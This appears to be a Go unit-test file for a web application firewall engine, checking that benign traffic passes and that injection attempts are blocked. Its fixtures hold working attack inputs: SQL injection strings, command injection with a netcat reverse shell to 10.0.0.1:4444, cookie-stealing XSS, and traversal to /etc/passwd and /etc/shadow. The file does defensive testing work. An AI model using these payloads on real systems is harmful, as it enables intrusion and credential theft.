package waf

import (
	"net/http"
	"strings"
	"testing"
	"time"
)

func TestSemanticEngine_BenignRequest(t *testing.T) {
	eng := NewSemanticEngine()

	ctx := &RequestContext{
		Method: "GET",
		Path:   "/api/v1/products",
		Query:  "category=electronics&page=1&limit=20&sort=asc",
		Headers: http.Header{
			"User-Agent": []string{"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"},
			"Accept":     []string{"application/json"},
			"Cookie":     []string{"session_id=abc123xyz456; theme=dark"},
		},
		Body: []byte(`{"search": "wireless headphones", "in_stock": true}`),
	}

	verdict, err := eng.InspectRequest(ctx)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if verdict.Action != ActionAllow {
		t.Errorf("expected ActionAllow, got %v (%s)", verdict.Action, verdict.Reason)
	}
}

func TestSemanticEngine_SQLiDetection(t *testing.T) {
	eng := NewSemanticEngine()

	testCases := []struct {
		name string
		ctx  *RequestContext
	}{
		{
			name: "SQLi in query parameter",
			ctx: &RequestContext{
				Method: "GET",
				Path:   "/search",
				Query:  "id=1'%20OR%20'1'='1",
			},
		},
		{
			name: "SQLi with double URL encoding evasion",
			ctx: &RequestContext{
				Method: "GET",
				Path:   "/items",
				Query:  "filter=%2527%2520UNION%2520SELECT%25201,2,3--",
			},
		},
		{
			name: "SQLi with inline comment evasion in JSON body",
			ctx: &RequestContext{
				Method: "POST",
				Path:   "/login",
				Headers: http.Header{
					"Content-Type": []string{"application/json"},
				},
				Body: []byte(`{"username": "admin'/**/OR/**/1=1--", "password": "x"}`),
			},
		},
		{
			name: "SQLi in Cookie header",
			ctx: &RequestContext{
				Method: "GET",
				Path:   "/dashboard",
				Headers: http.Header{
					"Cookie": []string{"user_pref=1; track_id=10' OR 1=1 --"},
				},
			},
		},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			verdict, err := eng.InspectRequest(tc.ctx)
			if err != nil {
				t.Fatalf("unexpected error: %v", err)
			}
			if verdict.Action != ActionBlock {
				t.Errorf("expected ActionBlock, got %v", verdict.Action)
			}
			if verdict.RuleID != "SEMANTIC_SQLI" && !strings.HasPrefix(verdict.RuleID, "SQLI_") && !strings.HasPrefix(verdict.RuleID, "LEXICAL_") {
				t.Errorf("expected SQLi RuleID, got %q", verdict.RuleID)
			}
		})
	}
}

func TestSemanticEngine_CmdIDetection(t *testing.T) {
	eng := NewSemanticEngine()

	testCases := []struct {
		name string
		ctx  *RequestContext
	}{
		{
			name: "CmdI with semicolon in query parameter",
			ctx: &RequestContext{
				Method: "GET",
				Path:   "/tools/ping",
				Query:  "host=127.0.0.1;%20cat%20/etc/passwd",
			},
		},
		{
			name: "CmdI with command substitution in JSON body",
			ctx: &RequestContext{
				Method: "POST",
				Path:   "/api/build",
				Headers: http.Header{
					"Content-Type": []string{"application/json"},
				},
				Body: []byte(`{"target": "$(whoami)"}`),
			},
		},
		{
			name: "CmdI with pipeline in custom header",
			ctx: &RequestContext{
				Method: "GET",
				Path:   "/status",
				Headers: http.Header{
					"X-Forwarded-Host": []string{"example.com | nc -e /bin/sh 10.0.0.1 4444"},
				},
			},
		},
		{
			name: "CmdI with backticks in url-encoded form body",
			ctx: &RequestContext{
				Method: "POST",
				Path:   "/run",
				Headers: http.Header{
					"Content-Type": []string{"application/x-www-form-urlencoded"},
				},
				Body: []byte("command=`id`&opt=1"),
			},
		},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			verdict, err := eng.InspectRequest(tc.ctx)
			if err != nil {
				t.Fatalf("unexpected error: %v", err)
			}
			if verdict.Action != ActionBlock {
				t.Errorf("expected ActionBlock, got %v", verdict.Action)
			}
			if verdict.RuleID != "SEMANTIC_CMDI" && !strings.HasPrefix(verdict.RuleID, "CMDI_") && !strings.HasPrefix(verdict.RuleID, "LEXICAL_") {
				t.Errorf("expected CmdI RuleID, got %q", verdict.RuleID)
			}
		})
	}
}

func TestSemanticEngine_XSSDetection(t *testing.T) {
	eng := NewSemanticEngine()

	testCases := []struct {
		name string
		ctx  *RequestContext
	}{
		{
			name: "XSS with script tag in query",
			ctx: &RequestContext{
				Method: "GET",
				Path:   "/search",
				Query:  "q=%3Cscript%3Ealert(1)%3C/script%3E",
			},
		},
		{
			name: "XSS attribute breakout in JSON body",
			ctx: &RequestContext{
				Method: "POST",
				Path:   "/api/comment",
				Headers: http.Header{
					"Content-Type": []string{"application/json"},
				},
				Body: []byte(`{"comment": "\" onerror=alert(1)"}`),
			},
		},
		{
			name: "XSS javascript pseudo-protocol in query",
			ctx: &RequestContext{
				Method: "GET",
				Path:   "/redirect",
				Query:  "url=javascript:alert(document.cookie)",
			},
		},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			verdict, err := eng.InspectRequest(tc.ctx)
			if err != nil {
				t.Fatalf("unexpected error: %v", err)
			}
			if verdict.Action != ActionBlock {
				t.Errorf("expected ActionBlock, got %v", verdict.Action)
			}
			if verdict.RuleID != "SEMANTIC_XSS" && !strings.HasPrefix(verdict.RuleID, "XSS_") && !strings.HasPrefix(verdict.RuleID, "LEXICAL_") {
				t.Errorf("expected XSS RuleID, got %q", verdict.RuleID)
			}
		})
	}
}

func TestSemanticEngine_OversizedParameterFallback(t *testing.T) {
	// Engine with small cap (1 KB)
	eng := NewSemanticEngine(WithMaxParamSize(1024))

	// Parameter > 1 KB containing SQLi
	oversizedSQLi := strings.Repeat("A", 1500) + "' OR '1'='1"

	ctx := &RequestContext{
		Method: "GET",
		Path:   "/search",
		Query:  "q=" + oversizedSQLi,
	}

	verdict, err := eng.InspectRequest(ctx)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	// Lexical triage fallback should block oversized parameter
	if verdict.Action != ActionBlock {
		t.Errorf("expected ActionBlock via lexical triage fallback, got %v", verdict.Action)
	}
	if !strings.HasPrefix(verdict.RuleID, "LEXICAL_") {
		t.Errorf("expected RuleID starting with LEXICAL_, got %q", verdict.RuleID)
	}
}

func TestSemanticEngine_PathTraversalDetection(t *testing.T) {
	eng := NewSemanticEngine()

	testCases := []struct {
		name string
		ctx  *RequestContext
	}{
		{
			name: "Classic dot-dot-slash /etc/passwd in query",
			ctx: &RequestContext{
				Method: "GET",
				Path:   "/public/download",
				Query:  "file=..%2F..%2F..%2F..%2Fetc%2Fpasswd",
			},
		},
		{
			name: "URL-encoded traversal (%2e%2e)",
			ctx: &RequestContext{
				Method: "GET",
				Path:   "/public/view",
				Query:  "doc=%2e%2e%2f%2e%2e%2fetc%2fpasswd",
			},
		},
		{
			name: "Windows win.ini backslash traversal",
			ctx: &RequestContext{
				Method: "GET",
				Path:   "/public/file",
				Query:  "name=..\\..\\windows\\win.ini",
			},
		},
		{
			name: "Sensitive file in JSON body",
			ctx: &RequestContext{
				Method: "POST",
				Path:   "/public/api/config",
				Headers: http.Header{
					"Content-Type": []string{"application/json"},
				},
				Body: []byte(`{"filepath": "/etc/shadow"}`),
			},
		},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			verdict, err := eng.InspectRequest(tc.ctx)
			if err != nil {
				t.Fatalf("unexpected error: %v", err)
			}
			if verdict.Action != ActionBlock {
				t.Errorf("expected ActionBlock, got %v", verdict.Action)
			}
			if verdict.RuleID != "SEMANTIC_TRAVERSAL" {
				t.Errorf("expected RuleID 'SEMANTIC_TRAVERSAL', got %q", verdict.RuleID)
			}
		})
	}
}

func TestSemanticEngine_OptionsAndName(t *testing.T) {
	eng := NewSemanticEngine(
		WithASTTimeout(10*time.Millisecond),
		WithMaxParamSize(64*1024),
	)

	if eng.Name() != "semantic" {
		t.Errorf("expected Name 'semantic', got %q", eng.Name())
	}
	if eng.maxParamSize != 64*1024 {
		t.Errorf("expected maxParamSize 64KB, got %d", eng.maxParamSize)
	}
	if eng.astTimeout != 10*time.Millisecond {
		t.Errorf("expected astTimeout 10ms, got %v", eng.astTimeout)
	}

	respVerdict, err := eng.InspectResponse(&ResponseContext{StatusCode: 200})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if respVerdict.Action != ActionAllow {
		t.Errorf("expected ActionAllow for response, got %v", respVerdict.Action)
	}
}
